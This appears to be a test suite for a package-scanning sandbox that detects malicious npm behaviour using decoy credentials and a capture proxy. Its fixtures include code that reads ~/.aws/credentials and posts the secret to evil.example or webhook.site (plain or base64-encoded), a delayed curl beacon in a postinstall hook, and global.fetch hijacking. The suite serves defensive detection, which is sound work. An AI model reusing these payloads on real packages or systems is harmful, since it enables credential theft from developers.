"use strict";

// #6 honeytoken canary sandbox. The execution seam is injected, so these tests
// exercise the full seed → capture-proxy → tripwire pipeline WITHOUT running any
// untrusted code: the injected runner is a controlled stand-in for a malicious
// postinstall (reads a decoy, beacons the token through the capture proxy).

const assert = require("node:assert/strict");
const test = require("node:test");
const fs = require("node:fs");
const fsp = require("node:fs/promises");
const os = require("node:os");
const path = require("node:path");
const http = require("node:http");
const net = require("node:net");
const tls = require("node:tls");
const {
  runCanarySandbox,
  seedCanaryFilesystem,
  matchTokens,
  makeRunId,
  detectSandboxWrapper
} = require("../src/sandbox");

// Send a proxied plaintext HTTP request (absolute-URI form, as an HTTP_PROXY
// client would) carrying `body` to the capture proxy on `port`.
function proxiedHttpPost(port, targetUrl, body) {
  return new Promise((resolve, reject) => {
    const req = http.request(
      { host: "127.0.0.1", port, method: "POST", path: targetUrl, headers: { host: new URL(targetUrl).host } },
      (res) => { res.resume(); res.on("end", resolve); }
    );
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

// Send a CONNECT (as an HTTPS-via-proxy client would) so the proxy records the
// intended destination host.
function proxiedConnect(port, authority) {
  return new Promise((resolve) => {
    const socket = net.connect(port, "127.0.0.1", () => {
      socket.write(`CONNECT ${authority} HTTP/1.1\r\nHost: ${authority}\r\n\r\n`);
    });
    socket.on("data", () => { socket.end(); resolve(); });
    socket.on("error", () => resolve());
    socket.on("close", () => resolve());
  });
}

async function stagedPackage(scriptsHook) {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-canary-pkg-"));
  await fsp.writeFile(
    path.join(dir, "package.json"),
    JSON.stringify({ name: "target", version: "1.0.0", scripts: scriptsHook || {} })
  );
  return dir;
}

test("#6 seedCanaryFilesystem writes attributable decoys with per-run tokens", async () => {
  const home = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-home-"));
  const runId = makeRunId();
  const canary = await seedCanaryFilesystem(home, runId);

  assert.ok(canary.files.length >= 5);
  // Each decoy actually exists and its token maps back to its path.
  for (const f of canary.files) {
    assert.equal(fs.existsSync(f.full), true);
    assert.equal(canary.tokens.get(f.token), f.rel);
    assert.ok(f.token.length >= 20, "token should be substantial random material");
  }
  // ANTI-EVASION: no honeypot marker string is written to disk, so a payload
  // grepping decoy CONTENTS for "canary"/"pkgxray"/"honeypot" can't skip them.
  for (const f of canary.files) {
    const body = fs.readFileSync(f.full, "utf8").toLowerCase();
    assert.ok(!body.includes("canary"), `${f.rel} leaks the word 'canary'`);
    assert.ok(!body.includes("pkgxray"), `${f.rel} leaks the word 'pkgxray'`);
    assert.ok(!body.includes("honeypot"), `${f.rel} leaks the word 'honeypot'`);
  }
  fs.rmSync(home, { recursive: true, force: true });
});

test("#6 matchTokens finds a leaked token in a captured blob", () => {
  const tokens = new Set(["PKGXRAYCANARY-abc-aws", "PKGXRAYCANARY-abc-env"]);
  const seen = matchTokens("POST body=PKGXRAYCANARY-abc-aws&x=1", tokens);
  assert.deepEqual(seen, ["PKGXRAYCANARY-abc-aws"]);
});

test("#6 requires explicit opt-in to execute", async () => {
  const pkgDir = await stagedPackage();
  await assert.rejects(
    () => runCanarySandbox({ stagedPath: pkgDir, allowExecution: false }),
    /refusing without explicit opt-in/
  );
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

test("#6 a payload that reads a decoy and beacons the token is caught as behavioral-exfil (block)", async () => {
  const pkgDir = await stagedPackage();
  // Injected 'malicious' runner: read the decoy AWS creds from the sandbox
  // HOME, then exfil the token over plaintext HTTP through the capture proxy.
  const runner = async ({ home, proxyPort }) => {
    const creds = await fsp.readFile(path.join(home, ".aws/credentials"), "utf8");
    const token = creds.match(/aws_secret_access_key\s*=\s*(\S+)/)[1];
    await proxiedHttpPost(proxyPort, "http://evil.example/collect", `stolen=${token}`);
    return { ran: [{ hook: "postinstall", simulated: true }] };
  };

  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });

  assert.equal(result.verdict, "block");
  const exfil = result.findings.find((f) => f.category === "behavioral-exfil");
  assert.ok(exfil, `findings: ${JSON.stringify(result.findings)}`);
  assert.equal(exfil.severity, "high");
  assert.match(exfil.rationale, /\.aws\/credentials/);
  assert.match(exfil.rationale, /evil\.example/);
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

test("#6 a payload that CONNECTs to a known callback host is caught as behavioral-network", async () => {
  const pkgDir = await stagedPackage();
  const runner = async ({ proxyPort }) => {
    await proxiedConnect(proxyPort, "webhook.site:443");
    return { ran: [] };
  };
  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });
  assert.equal(result.verdict, "block");
  assert.ok(result.findings.some((f) => f.category === "behavioral-network" && f.snippet.includes("webhook.site")));
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

test("#6 a benign payload with no egress yields a 'not-observed' behavioral verdict (never 'safe')", async () => {
  const pkgDir = await stagedPackage();
  const runner = async () => ({ ran: [{ hook: "postinstall", simulated: true }] });
  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });
  // A clean behavioral run can never CLEAR a package — the verdict vocabulary
  // reflects that: it is "not-observed", never "safe".
  assert.equal(result.verdict, "not-observed");
  assert.notEqual(result.verdict, "safe");
  assert.equal(result.confirmsButCannotClear, true);
  assert.equal(result.egress.length, 0);
  assert.ok(!result.findings.some((f) => f.severity === "high"));
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

test("#6 ordinary outbound egress (non-callback host) is review, not block", async () => {
  const pkgDir = await stagedPackage();
  const runner = async ({ proxyPort }) => {
    await proxiedHttpPost(proxyPort, "http://api.example.com/telemetry", "ping=1");
    return { ran: [] };
  };
  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });
  assert.equal(result.verdict, "review");
  assert.ok(result.findings.some((f) => f.category === "behavioral-network" && f.severity === "medium"));
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

// --- #6 process-group kill + post-settle egress grace window ---------------

const { killProcessGroup, execWithTimeout } = require("../src/sandbox");

// A timeout must kill the WHOLE process group, not just the direct `sh`. A
// shell that backgrounds a grandchild (`(sleep ...; touch marker) &`) would
// otherwise leave that grandchild alive to run after the direct process is
// SIGKILLed. We prove the group kill worked by asserting the marker the
// grandchild WOULD have written never appears.
test("#6 timeout kills the whole detached process group (backgrounded grandchild does not survive)", { skip: process.platform === "win32" }, async () => {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-pgroup-"));
  const marker = path.join(dir, "grandchild-ran");
  // Grandchild sleeps past the timeout, then writes a marker. If only the
  // direct shell is killed, the grandchild survives and the marker appears.
  const command = `(sleep 2; touch ${JSON.stringify(marker)}) & echo started; sleep 5`;
  const outcome = await execWithTimeout(command, { cwd: dir, env: process.env, timeoutMs: 300, wrapper: null });
  assert.equal(outcome.timedOut, true, "the direct shell should have been timeout-killed");
  // Wait past when the grandchild's `sleep 2` would have fired.
  await new Promise((r) => setTimeout(r, 2500));
  assert.equal(fs.existsSync(marker), false, "grandchild survived the process-group kill and wrote its marker");
  fs.rmSync(dir, { recursive: true, force: true });
});

// killProcessGroup signals the NEGATIVE pid (the group), not just the child.
// Assert the group-kill code path is taken by observing process.kill(-pid).
test("#6 killProcessGroup signals the process group (negative pid), guarded for ESRCH", { skip: process.platform === "win32" }, () => {
  const original = process.kill;
  const calls = [];
  process.kill = (pid, sig) => { calls.push({ pid, sig }); };
  try {
    killProcessGroup({ pid: 4242 }, "SIGKILL");
  } finally {
    process.kill = original;
  }
  assert.deepEqual(calls, [{ pid: -4242, sig: "SIGKILL" }], "should signal the whole group via negative pid");

  // ESRCH (group already reaped) must be swallowed, not thrown.
  process.kill = () => { const e = new Error("no such process"); e.code = "ESRCH"; throw e; };
  try {
    assert.doesNotThrow(() => killProcessGroup({ pid: 4243 }, "SIGKILL"));
  } finally {
    process.kill = original;
  }
});

// A delayed backgrounded beacon that fires AFTER the runner settles must still
// be captured, because the proxy is kept alive for the grace window. Uses the
// REAL execWithTimeout runner (not an injected stand-in) so the detached
// spawn + grace-window teardown are exercised end to end.
test("#6 a post-settle delayed beacon is still captured during the egress grace window", { skip: process.platform === "win32" }, async () => {
  const pkgDir = await stagedPackage({
    // Backgrounded curl: the postinstall returns immediately (`echo done`) while
    // a grandchild beacons ~400ms later — after the runner promise settles.
    postinstall: "(sleep 0.4; curl -s http://beacon.example/ping >/dev/null 2>&1) & echo done"
  });
  const result = await runCanarySandbox({
    stagedPath: pkgDir,
    allowExecution: true,
    timeoutMs: 5000,
    egressGraceMs: 1500
  });
  // curl may or may not be present; only assert capture if any egress happened.
  if (result.egress.length > 0) {
    assert.ok(
      result.egress.some((h) => h.host && h.host.includes("beacon.example")),
      `delayed beacon not captured: ${JSON.stringify(result.egress)}`
    );
  }
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

// --- import-phase detonation (malicious-on-first-require, not on install) ---

const { runImportPhase, runInstallAndImport } = require("../src/sandbox");

// Stage a package whose ENTRY POINT (not any install script) beacons on load —
// the flatmap-stream / malicious-on-first-require shape. `main` points at a
// module that reads the decoy AWS creds from HOME and POSTs the token through
// the proxy the moment it is required. A lifecycle-only run never triggers it.
async function stagedImportPayloadPackage({ main = "index.js", type } = {}) {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-import-pkg-"));
  await fsp.writeFile(
    path.join(dir, "package.json"),
    JSON.stringify({ name: "import-target", version: "1.0.0", main, ...(type ? { type } : {}), scripts: {} })
  );
  // Top-level side effect: read decoy creds from HOME, exfil the token to a
  // callback host through the proxy that HTTP(S)_PROXY points at. Written to run
  // under either CJS require or ESM import (only node built-ins, no deps).
  const payload = `
const fs = require('node:fs');
const http = require('node:http');
const os = require('node:os');
const path = require('node:path');
try {
  const creds = fs.readFileSync(path.join(os.homedir(), '.aws/credentials'), 'utf8');
  const token = (creds.match(/aws_secret_access_key\\s*=\\s*(\\S+)/) || [])[1];
  const proxy = process.env.HTTP_PROXY || process.env.http_proxy;
  if (token && proxy) {
    const u = new URL(proxy);
    const req = http.request({ host: u.hostname, port: u.port, method: 'POST',
      path: 'http://webhook.site/collect', headers: { host: 'webhook.site' } });
    req.on('error', () => {});
    req.end('stolen=' + token);
  }
} catch (e) { /* best effort */ }
`;
  await fsp.writeFile(path.join(dir, main), payload);
  return dir;
}

// The headline capability: the DEFAULT runner detonates the import phase, so a
// package that is benign at install but malicious on first require is caught —
// the gap a lifecycle-only canary leaves open. Uses the real runInstallAndImport
// (no injected runner), so this exercises the actual probe → node → proxy path.
test("#6 import phase catches a payload that fires on require, not on install", { skip: process.platform === "win32" }, async () => {
  const pkgDir = await stagedImportPayloadPackage();
  const result = await runCanarySandbox({
    stagedPath: pkgDir,
    allowExecution: true,
    timeoutMs: 8000,
    egressGraceMs: 1500
  });
  assert.equal(result.verdict, "block", `expected block, got ${result.verdict}: ${JSON.stringify(result.findings)}`);
  assert.ok(
    result.findings.some((f) => f.category === "behavioral-exfil" || f.category === "behavioral-network"),
    `import-time beacon not caught: ${JSON.stringify(result.findings)}`
  );
  // The result records that the import phase actually ran.
  assert.equal(result.executed.importPhase.attempted, true);
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

// Proves the SPECIFIC gap being closed: the same payload run through the
// install phase ALONE (lifecycle scripts, no import) is NOT observed — there are
// no install scripts to fire. This is the before/after that justifies the row.
test("#6 lifecycle-only run does NOT observe the import-time payload (the gap import phase closes)", { skip: process.platform === "win32" }, async () => {
  const pkgDir = await stagedImportPayloadPackage();
  const result = await runCanarySandbox({
    stagedPath: pkgDir,
    allowExecution: true,
    timeoutMs: 8000,
    egressGraceMs: 500,
    importPhase: false // install phase only
  });
  assert.equal(result.egress.length, 0, `lifecycle-only should see no egress: ${JSON.stringify(result.egress)}`);
  assert.equal(result.verdict, "not-observed");
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

// A benign package that merely loads on import (no egress, no decoy read) stays
// 'not-observed' — the import phase must not manufacture findings on its own.
test("#6 import phase of a benign package yields no findings", { skip: process.platform === "win32" }, async () => {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-import-benign-"));
  await fsp.writeFile(path.join(dir, "package.json"), JSON.stringify({ name: "benign", version: "1.0.0", main: "index.js", scripts: {} }));
  await fsp.writeFile(path.join(dir, "index.js"), "module.exports = { add: (a, b) => a + b };\n");
  const result = await runCanarySandbox({ stagedPath: dir, allowExecution: true, timeoutMs: 8000, egressGraceMs: 300 });
  assert.equal(result.verdict, "not-observed");
  assert.equal(result.egress.length, 0);
  assert.equal(result.executed.importPhase.attempted, true);
  fs.rmSync(dir, { recursive: true, force: true });
});

// A staged package with no resolvable entry must not crash the import phase —
// it records attempted:false and the run still completes.
test("#6 import phase skips cleanly when the package has no resolvable entry", { skip: process.platform === "win32" }, async () => {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-import-noentry-"));
  // No package.json main and no index.js → require.resolve fails inside the probe.
  await fsp.writeFile(path.join(dir, "package.json"), JSON.stringify({ name: "noentry", version: "1.0.0", scripts: {} }));
  const result = await runCanarySandbox({ stagedPath: dir, allowExecution: true, timeoutMs: 8000, egressGraceMs: 200 });
  assert.equal(result.verdict, "not-observed");
  assert.equal(result.executed.importPhase.attempted, true); // probe ran; entry just didn't resolve
  fs.rmSync(dir, { recursive: true, force: true });
});

// --- #6 runtime-hook tripwire: the response-rewriting clipper (chalk/qix) -----
// A crypto-clipper exfiltrates nothing — it reassigns global.fetch at import to
// rewrite responses in place. Static analysis can't tell it from middleware; the
// canary's import probe watches the global mutation happen.
const { evaluateTripwires, extractRuntimeHooks } = require("../src/sandbox");

test("#6 a package that monkeypatches global.fetch at import is caught as behavioral-runtime-hook (block)", { skip: process.platform === "win32" }, async () => {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-clipper-"));
  await fsp.writeFile(path.join(dir, "package.json"), JSON.stringify({ name: "clipper", version: "1.0.0", main: "index.js" }));
  // The v6 fixture: wrap global.fetch so every later call can be tampered with.
  await fsp.writeFile(path.join(dir, "index.js"),
    "const _f = globalThis.fetch;\n" +
    "globalThis.fetch = async (...a) => { const r = await _f(...a); return r; };\n" +
    "module.exports = {};\n");
  const result = await runCanarySandbox({ stagedPath: dir, allowExecution: true, timeoutMs: 8000, egressGraceMs: 100 });
  assert.equal(result.verdict, "block");
  const hook = result.findings.find((f) => f.category === "behavioral-runtime-hook");
  assert.ok(hook, `findings: ${JSON.stringify(result.findings)}`);
  assert.equal(hook.severity, "high");
  assert.match(hook.snippet, /globalThis\.fetch/);
  // no token left the box — the egress tripwires must stay silent
  assert.equal(result.egress.length, 0);
  fs.rmSync(dir, { recursive: true, force: true });
});

test("#6 runtime-hook tripwire fires HIGH from observed global reassignment", async () => {
  const findings = await evaluateTripwires({ tokens: new Map(), files: [] }, [], ["globalThis.fetch", "Response.prototype.json"]);
  const hook = findings.find((f) => f.category === "behavioral-runtime-hook");
  assert.ok(hook);
  assert.equal(hook.severity, "high");
  assert.match(hook.snippet, /Response\.prototype\.json/);
});

test("#6 no runtime-hook finding when the import probe observed no tampering", async () => {
  assert.deepEqual(extractRuntimeHooks({ importPhase: { runtimeHooks: [] } }), []);
  assert.deepEqual(extractRuntimeHooks({ importPhase: {} }), []);
  const findings = await evaluateTripwires({ tokens: new Map(), files: [] }, [], []);
  assert.ok(!findings.some((f) => f.category === "behavioral-runtime-hook"));
});

test("#6 extractRuntimeHooks reads the verified runtimeHooks field, not stdout", () => {
  // The signal now comes from the nonce-verified result file (surfaced by
  // runImportPhase as importPhase.runtimeHooks), not from parsing stdout — so a
  // forged marker on the output stream can no longer inject or suppress it.
  assert.deepEqual(
    extractRuntimeHooks({ importPhase: { runtimeHooks: ["globalThis.fetch", "XMLHttpRequest.prototype.open"] } }),
    ["globalThis.fetch", "XMLHttpRequest.prototype.open"]
  );
  // a stray stdout marker is ignored; a wrong-typed field yields nothing
  assert.deepEqual(extractRuntimeHooks({ importPhase: { output: "__PKGXRAY_HOOK__[\"x\"]__END__" } }), []);
  assert.deepEqual(extractRuntimeHooks({ importPhase: { runtimeHooks: "nope" } }), []);
  assert.deepEqual(extractRuntimeHooks({}), []);
});

test("#6 a clipper that floods stdout and forges a stdout marker is still caught (file+nonce channel)", { skip: process.platform === "win32" }, async () => {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-clipper-evade-"));
  await fsp.writeFile(path.join(dir, "package.json"), JSON.stringify({ name: "evader", version: "1.0.0", main: "index.js" }));
  // Print a fake empty marker AND flood stdout past execWithTimeout's 2KB cap to
  // defeat the old stdout-based detector, THEN reassign global.fetch. The result
  // file (unguessable path, nonce-stamped, written via a captured writeFileSync)
  // still carries the real observation.
  await fsp.writeFile(path.join(dir, "index.js"),
    "process.stdout.write('__PKGXRAY_HOOK__[]__END__');\n" +
    "process.stdout.write('x'.repeat(5000));\n" +
    "const _f = globalThis.fetch;\n" +
    "globalThis.fetch = async (...a) => _f(...a);\n" +
    "module.exports = {};\n");
  const result = await runCanarySandbox({ stagedPath: dir, allowExecution: true, timeoutMs: 8000, egressGraceMs: 100 });
  assert.equal(result.verdict, "block");
  assert.ok(result.findings.some((f) => f.category === "behavioral-runtime-hook"), `findings: ${JSON.stringify(result.findings)}`);
  fs.rmSync(dir, { recursive: true, force: true });
});

test("#6 a clipper that patches global.fetch in a microtask is still caught (post-import settle)", { skip: process.platform === "win32" }, async () => {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-clipper-defer-"));
  await fsp.writeFile(path.join(dir, "package.json"), JSON.stringify({ name: "deferred", version: "1.0.0", main: "index.js" }));
  // Defer the reassignment to a microtask scheduled AFTER import resolves — a
  // purely synchronous diff would miss it; the probe's post-import settle catches it.
  await fsp.writeFile(path.join(dir, "index.js"),
    "const _f = globalThis.fetch;\n" +
    "queueMicrotask(() => { globalThis.fetch = async (...a) => _f(...a); });\n" +
    "module.exports = {};\n");
  const result = await runCanarySandbox({ stagedPath: dir, allowExecution: true, timeoutMs: 8000, egressGraceMs: 100 });
  assert.equal(result.verdict, "block");
  assert.ok(result.findings.some((f) => f.category === "behavioral-runtime-hook"), `findings: ${JSON.stringify(result.findings)}`);
  fs.rmSync(dir, { recursive: true, force: true });
});

// --- hardening: encoded-exfil, bounded teardown, resource caps, net confinement ---

const { tokenVariants, buildRlimitPrefix } = require("../src/sandbox");

// A payload that base64-encodes the stolen token before POSTing would defeat a
// plain substring match. matchTokens now also probes reversible encodings, so
// the leak is still attributed to the exact decoy.
test("#6 an encoded (base64) canary leak is still caught as behavioral-exfil", async () => {
  const pkgDir = await stagedPackage();
  const runner = async ({ home, proxyPort }) => {
    const creds = await fsp.readFile(path.join(home, ".aws/credentials"), "utf8");
    const token = creds.match(/aws_secret_access_key\s*=\s*(\S+)/)[1];
    const encoded = Buffer.from(token, "utf8").toString("base64");
    await proxiedHttpPost(proxyPort, "http://evil.example/collect", `blob=${encoded}`);
    return { ran: [{ hook: "postinstall", simulated: true }] };
  };
  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });
  assert.equal(result.verdict, "block");
  assert.ok(
    result.findings.some((f) => f.category === "behavioral-exfil"),
    `encoded leak not caught: ${JSON.stringify(result.findings)}`
  );
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

test("#6 tokenVariants covers base64 / base64url / hex / url-encoding", () => {
  const variants = tokenVariants("a/b+c=d e");
  assert.ok(variants.includes("a/b+c=d e"), "keeps the verbatim token");
  assert.ok(variants.includes(Buffer.from("a/b+c=d e").toString("base64")));
  assert.ok(variants.includes(Buffer.from("a/b+c=d e").toString("hex")));
  assert.ok(variants.includes(encodeURIComponent("a/b+c=d e")));
});

// A payload that opens a keep-alive connection to the capture proxy and never
// closes it must NOT wedge teardown: server.close()'s callback only fires once
// every socket ends, so the run bounds it by force-destroying lingering sockets.
test("#6 a lingering keep-alive connection to the proxy does not hang teardown", { skip: process.platform === "win32" }, async () => {
  const pkgDir = await stagedPackage();
  let held;
  const runner = ({ proxyPort }) =>
    new Promise((resolve) => {
      // Open a raw socket to the proxy and hold it open (never end it).
      held = net.connect(proxyPort, "127.0.0.1", () => {
        held.write("GET http://lingering.example/ HTTP/1.1\r\nHost: lingering.example\r\n\r\n");
        // Return from the runner while the socket stays open.
        setTimeout(() => resolve({ ran: [{ hook: "postinstall", simulated: true }] }), 50);
      });
      held.on("error", () => resolve({ ran: [] }));
    });

  // If teardown could hang this would never resolve; bound the whole run.
  const result = await Promise.race([
    runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 }),
    new Promise((_, rej) => setTimeout(() => rej(new Error("teardown hung on a lingering connection")), 8000))
  ]);
  assert.ok(result.runId, "run completed despite a held-open proxy connection");
  try { held.destroy(); } catch { /* noop */ }
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

// Resource caps are applied via `ulimit` in the spawned POSIX shell: assert the
// child actually runs under the lowered process/file limits (proves the prefix
// is in effect, not just present as a string).
test("#6 ulimit resource caps are applied to the untrusted child", { skip: process.platform === "win32" }, async () => {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-ulimit-"));
  // Read back file-size and core-dump caps — both are universally supported by
  // POSIX sh (dash AND bash), unlike `-u` which Ubuntu's dash rejects. `ulimit`
  // echoes back the exact value we set, so this proves the caps are in effect.
  const outcome = await execWithTimeout("ulimit -f; ulimit -c", {
    cwd: dir,
    env: process.env,
    timeoutMs: 5000,
    wrapper: null,
    rlimits: { fileSizeBlocks: 4321, coreDumps: 0 }
  });
  const lines = String(outcome.output || "").trim().split(/\s+/);
  assert.ok(lines.includes("4321"), `expected file-size cap 4321 in child ulimit output: ${outcome.output}`);
  assert.ok(lines.includes("0"), `expected core-dump cap 0 in child ulimit output: ${outcome.output}`);
  fs.rmSync(dir, { recursive: true, force: true });
});

test("#6 buildRlimitPrefix is a no-op when disabled, guards each limit separately, and derives CPU cap from the timeout", () => {
  assert.equal(buildRlimitPrefix(20000, false), "");
  const prefix = buildRlimitPrefix(20000, undefined);
  if (process.platform !== "win32") {
    assert.match(prefix, /^ulimit /);
    assert.match(prefix, /ulimit -t 30\b/); // ceil(20000/1000) + 10
    assert.match(prefix, /ulimit -c \d+ 2>\/dev\/null/);
    // Each limit must be its OWN error-guarded statement so an unsupported flag
    // can't abort the others — regression guard for the dash `-u` CI failure.
    assert.ok(!/ulimit -t \d+ -/.test(prefix), "limits must not be combined into one ulimit call");
    assert.match(prefix, /2>\/dev\/null; $/);
    // ulimit -u is OFF by default (per-UID starvation on macOS + dash rejects
    // it); it must be absent unless explicitly requested, and present when it is.
    assert.ok(!/ulimit -u/.test(prefix), "maxProcs (-u) must be off by default");
    assert.match(buildRlimitPrefix(20000, { maxProcs: 200 }), /ulimit -u 200 2>\/dev\/null/);
  } else {
    assert.equal(prefix, "");
  }
});

// On macOS the OS profile must deny non-loopback egress (so a raw-socket exfil
// is blocked at the boundary, not merely unobserved) while keeping loopback
// open for the capture proxy.
test("#6 macOS sandbox-exec profile confines network to loopback", { skip: process.platform !== "darwin" }, () => {
  const info = detectSandboxWrapper("/tmp/pkgxray-sbtest");
  if (info.level !== "sandbox-exec") return; // sandbox-exec not present
  assert.equal(info.netConfined, true);
  const argv = info.wrap(["sh", "-c", "true"]);
  const profile = argv[argv.indexOf("-p") + 1];
  assert.match(profile, /\(deny network\*\)/);
  assert.match(profile, /allow network-outbound \(remote ip "localhost:\*"\)/);
});

// Runtime coverage of the real wrapper: the profile must DENY non-loopback
// egress at the OS boundary (a raw-socket exfil that ignores the proxy env vars)
// while NOT severing loopback (the capture proxy). Distinguishes an SBPL block
// (EPERM) from "allowed but nothing listening" (ECONNREFUSED/timeout), so it's
// independent of whether any external network is reachable in the test env.
test("#6 macOS sandbox-exec denies external egress but permits loopback (runtime)", { skip: process.platform !== "darwin" }, () => {
  const info = detectSandboxWrapper("/tmp/pkgxray-net-rt");
  if (info.level !== "sandbox-exec") return;
  const { spawnSync } = require("node:child_process");
  const run = (js) => {
    const argv = info.wrap(["node", "-e", js]);
    return spawnSync(argv[0], argv.slice(1), { encoding: "utf8", timeout: 8000 });
  };
  const probe = (port, host) =>
    `const s=require('net').connect(${port},'${host}');` +
    `s.on('error',e=>{console.log('CODE:'+e.code);process.exit(0)});` +
    `s.on('connect',()=>{console.log('CODE:CONNECTED');s.destroy();process.exit(0)});` +
    `setTimeout(()=>{console.log('CODE:TIMEOUT');process.exit(0)},4000);`;
  // External (TEST-NET-3, non-loopback) → the OS profile must EPERM-deny it.
  const ext = run(probe(80, "203.0.113.1"));
  assert.match(ext.stdout || "", /CODE:EPERM/, `external egress should be OS-denied (EPERM): ${ext.stdout} ${ext.stderr}`);
  // Loopback (nothing listening) → must NOT be EPERM (ECONNREFUSED/timeout ok).
  // An EPERM here would mean the profile severed the capture proxy.
  const loop = run(probe(59999, "127.0.0.1"));
  assert.doesNotMatch(loop.stdout || "", /CODE:EPERM/, `loopback to the proxy must not be OS-denied: ${loop.stdout} ${loop.stderr}`);
});

test("#6 --require-sandbox fails closed when no OS sandbox wrapper is available", async () => {
  const os = require("node:os");
  const level = detectSandboxWrapper(os.tmpdir()).level;
  if (level !== "env-only") {
    // An OS sandbox (bwrap / sandbox-exec) IS present on this host, so
    // requireSandbox is satisfiable — the fail-closed path can't be exercised
    // here. (The negative case is covered wherever isolation is env-only.)
    return;
  }
  await assert.rejects(
    () =>
      runCanarySandbox({
        stagedPath: os.tmpdir(),
        allowExecution: true,
        requireSandbox: true,
        egressGraceMs: 0,
        runner: async () => ({ ran: [] }), // must never be reached
      }),
    (e) => e.code === "SANDBOX_REQUIRED"
  );
});

// --- netns confinement: forwarder + unix-socket proxy plumbing ---------------

const {
  startCaptureProxy,
  startTcpToUnixForwarder,
  buildNetnsBootstrap,
  detectNetnsConfinement
} = require("../src/sandbox");

// The load-bearing plumbing behind netns confinement, exercised on the host
// loopback (no bwrap/netns needed to prove the pieces): a payload that respects
// HTTP_PROXY reaches the parent capture proxy THROUGH the TCP→unix forwarder,
// and its leaked token is still attributed. This is the observation path the
// netns tier depends on; if it broke, netns runs would go silently blind.
test("#6 forwarder relays a proxied request across a unix socket into the capture proxy", { skip: process.platform === "win32" }, async () => {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-fwd-"));
  const sockPath = path.join(dir, "cap.sock");
  const token = "unix-forward-token-abc123";
  const proxy = await startCaptureProxy(new Set([token]), { unixPath: sockPath });

  // Forwarder on an ephemeral loopback port → the proxy's unix socket.
  let ready;
  const readyP = new Promise((r) => { ready = r; });
  const fwd = startTcpToUnixForwarder(0, sockPath, () => ready());
  await readyP;
  const innerPort = fwd.address().port;

  // A proxy-respecting client posts the token through the forwarder.
  await proxiedHttpPost(innerPort, "http://victim.example/x", `stolen=${token}`);
  // Give the async pipe a moment to deliver.
  await new Promise((r) => setTimeout(r, 150));

  assert.ok(
    proxy.hits.some((h) => (h.tokensSeen || []).includes(token)),
    `token not captured through the forwarder: ${JSON.stringify(proxy.hits)}`
  );
  fwd.close();
  await proxy.close();
  fs.rmSync(dir, { recursive: true, force: true });
});

// The parent capture proxy binds BOTH a TCP port and (when asked) a unix
// socket, and both feed one hits array — so the shared-net and netns tiers can
// coexist without duplicating capture logic.
test("#6 capture proxy exposes a unix socket alongside its TCP port when requested", {
  // Windows has no AF_UNIX socket at a filesystem path — the equivalent is a
  // named pipe under \\.\pipe\, so binding one under the temp dir fails with
  // EACCES ("listen EACCES ...\\cap.sock"). The unix-socket tier exists to feed
  // the Linux netns forwarder, which is itself linux-only, so there is no
  // Windows behavior being left unasserted here.
  skip: process.platform === "win32"
    ? "AF_UNIX path sockets do not exist on win32 (named pipes are the equivalent)"
    : false
}, async () => {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-dual-"));
  const sockPath = path.join(dir, "cap.sock");
  const proxy = await startCaptureProxy(new Set(["t"]), { unixPath: sockPath });
  assert.equal(typeof proxy.port, "number");
  assert.equal(proxy.unixPath, sockPath);
  assert.equal(fs.existsSync(sockPath), true, "unix socket should be bound on disk");
  await proxy.close();
  fs.rmSync(dir, { recursive: true, force: true });
});

// The bootstrap is pure string construction, so its shape is asserted directly:
// it brings up loopback, launches the forwarder, waits for readiness, runs the
// payload, and holds the forwarder open for the grace window before teardown.
test("#6 netns bootstrap brings up lo, waits for the forwarder, then runs the payload", () => {
  const bootstrap = buildNetnsBootstrap({
    nodeBin: "/usr/bin/node",
    selfPath: "/repo/src/sandbox.js",
    innerPort: 18080,
    sockPath: "/sb/cap.sock",
    readyFile: "/sb/fw.ready",
    ipBin: "ip",
    graceMs: 1000,
    payloadCmd: "echo PAYLOAD"
  });
  assert.match(bootstrap, /'ip' link set lo up/);
  assert.match(bootstrap, /__forwarder 18080 '\/sb\/cap\.sock' '\/sb\/fw\.ready'/);
  assert.match(bootstrap, /while \[ ! -f '\/sb\/fw\.ready' \]/);
  assert.match(bootstrap, /echo PAYLOAD/);
  // Payload status is preserved and the forwarder is torn down after the grace.
  assert.match(bootstrap, /__status=\$\?/);
  assert.match(bootstrap, /sleep 1\n/);
  assert.match(bootstrap, /kill \$__fw/);
  assert.match(bootstrap, /exit \$__status/);
});

// Fail-safe contract: on a host without bwrap+ip, netns confinement reports
// UNAVAILABLE (null) — the caller then keeps today's shared-net/env-only
// behavior. This is what keeps an environment that can't prove confinement from
// ever claiming netConfined:true.
